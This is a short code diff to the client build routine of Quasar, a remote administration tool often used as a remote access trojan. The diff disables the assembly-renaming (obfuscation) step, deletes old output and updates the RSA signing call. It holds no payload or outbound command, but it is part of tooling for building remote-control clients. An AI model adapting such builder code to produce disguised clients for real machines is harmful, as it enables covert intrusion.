@@ -6,6 +6,7 @@ using System;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
+using System.IO;
 using Vestris.ResourceLib;
 
 namespace Quasar.Server.Build
@@ -29,19 +30,24 @@ namespace Quasar.Server.Build
         /// </summary>
         public void Build()
         {
+            if (File.Exists(_options.OutputPath))
+            {
+                File.Delete(_options.OutputPath);
+            }
             using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
             {
                 // PHASE 1 - Writing settings
                 WriteSettings(asmDef);
-
+                /*
                 // PHASE 2 - Renaming
                 Renamer r = new Renamer(asmDef);
 
                 if (!r.Perform())
                     throw new Exception("renaming failed");
-
+                */
+                // File.Copy(_clientFilePath, _options.OutputPath);
                 // PHASE 3 - Saving
-                r.AsmDef.Write(_options.OutputPath);
+                asmDef.Write(_options.OutputPath);
             }
 
             // PHASE 4 - Assembly Information changing
@@ -88,10 +94,10 @@ namespace Quasar.Server.Build
 
             byte[] signature;
             // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
-            using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
+            using (var rsa = caCertificate.GetRSAPrivateKey())
             {
                 var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
-                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
+                signature = rsa.SignHash(hash, HashAlgorithmName.SHA256,RSASignaturePadding.Pkcs1);
             }
 
             foreach (var typeDef in asmDef.Modules[0].Types)
